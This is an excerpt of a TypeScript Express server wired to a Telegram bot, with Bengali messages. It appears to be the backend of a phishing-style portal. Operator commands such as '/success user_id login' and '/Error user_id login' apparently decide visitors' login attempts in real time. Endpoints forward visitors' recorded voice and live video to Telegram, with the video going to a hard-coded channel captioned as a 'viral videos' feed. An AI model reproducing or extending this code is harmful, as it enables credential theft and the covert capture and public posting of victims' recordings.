...
function setupTelegramListeners(tgBot: TelegramBot) {
  tgBot.on('message', async (msg) => {
    try {
      ...
      // Matches /success user_id login, /success_user_123456_login etc.
      ...
      // Matches /Error user_id login, /Error_user_123456_login, /error_user_123456_login etc.
...
app.post('/api/sessions/:id/voice-reply', async (req, res) => {
  const sessionId = req.params.id;
  const { audioData } = req.body; // base64 payload
  ...
  try {
    ...
    if (tgBot && chatId) {
      await tgBot.sendVoice(chatId, buffer, {
        caption: `🎙️ <b>কণ্ঠবার্তা প্রতিক্রিয়া!</b>\n👤 <b>গ্রাহক আইডি:</b> <code>${sessionId}</code>`,
        parse_mode: 'HTML'
      }, {
        filename: `reply_${sessionId}.ogg`,
        contentType: 'audio/ogg'
      });
      return res.json({ success: true, message: 'কণ্ঠবার্তা সফলভাবে টেলিগ্রামে পাঠানো হয়েছে।' });
    } else {
      return res.status(500).json({ success: false, message: 'টেলিগ্রাম বটের সাথে সংযোগ সক্রিয় নয়।' });
    }
  } catch (err: any) {
    console.error("Error sending voice to telegram:", err);
    return res.status(500).json({ success: false, message: 'ভয়েস পাঠাতে সমস্যা হয়েছে: ' + err.message });
  }
});

app.post('/api/sessions/:id/video-reply', async (req, res) => {
  const sessionId = req.params.id;
  const { videoData } = req.body; // base64 payload
  ...
  try {
    ...
    const tgBot = getTelegramBot();
    // Prioritize the TELEGRAM_CHANNEL_ID environment variable, else route to user's specified viral channel id (-1003552771281)
    const channelId = process.env.TELEGRAM_CHANNEL_ID || '-1003552771281';
    
    if (tgBot && channelId) {
      // Send as standard MP4 video to the Telegram Channel
      await tgBot.sendVideo(channelId, buffer, {
        caption: `📹 <b>গ্রাহকের লাইভ ভিডিও রেকর্ড!</b>\n👤 <b>গ্রাহক আইডি:</b> <code>${sessionId}</code>\n📢 <b>চ্যানেল:</b> সকল Viral ভিডিও এক জায়গায় 🔥\n⏰ <b>রেকর্ডের সময়:</b> ${new Date().toLocaleTimeString('bn-BD', {timeZone: 'Asia/Dhaka'})} (বাংলাদেশ সময়)`,
        parse_mode: 'HTML'
      }, {
        filename: `video_${sessionId}.mp4`,
        contentType: 'video/mp4'
      });
      return res.json({ success: true, message: 'ভিডিও সফলভাবে টেলিগ্রাম চ্যানেলে পাঠানো হয়েছে।' });
    } else {
      return res.status(500).json({ success: false, message: 'টেলিগ্রাম বটের সাথে সংযোগ সক্রিয় নয়।' });
    }
  } catch (err: any) {
    console.error("Error sending video to telegram:", err);
    return res.status(500).json({ success: false, message: 'ভিডিও পাঠাতে সমস্যা হয়েছে: ' + err.message });
  }
});
...
async function startServer() {
  // Direct endpoint to serve the uploaded portal logo image from root or public folder
  app.get('/my-logo.jpg', (req, res) => {
    const rootPath = path.join(process.cwd(), 'my-logo.jpg');
    const publicPath = path.join(process.cwd(), 'public', 'my-logo.jpg');
    ...
    if (fs.existsSync(rootPath)) {
      ...
      return res.status(404).send('Logo file not uploaded or found.');
    }
  });
